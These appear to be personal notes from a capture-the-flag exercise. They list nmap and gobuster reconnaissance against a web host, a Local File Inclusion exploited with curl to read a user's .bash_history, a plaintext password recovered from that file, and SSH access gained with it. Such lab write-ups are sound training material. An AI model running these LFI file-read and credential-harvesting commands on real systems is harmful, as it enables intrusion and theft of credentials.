Date: 5/29/26
Flags: 2 total

- 1) Browsed to IP site and found website with potential Local File Inclusion (LFI) vulnerability
- 2) Ran NMAP scan against target
	- Command: Nmap -sv 34.241.22.194
	- Results: ![[Cronopacalypse NMAP Scan.png]]
- 3) Ran GoBuster to enumerate hidden directories on web page
	- Command Ran: `gobuster dir -u http://34.245.226.103 -w ~/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
- 4) LFI - http://<http://34.245.226.103>/read?file=flag.txt
	- LFI Available
- 5) Curl Request
	- curl "http://34.245.226.103/read?file=flag-user.txt"
	- Access Denied!
- 6) Accessing bash_history
	- curl http://34.245.226.103/read?file=/home/ctf/.bash_history
	- ![[Pasted image 20260601101823.png]]
	- User: ctf
	- PW: Sup3rStr0ngP@ssw0rd!
- 7) SSH into system using credentialls
	- ssh ctf@34.245.226.103
- 8) Once in system search for flag, cat file, and enter into HDNA site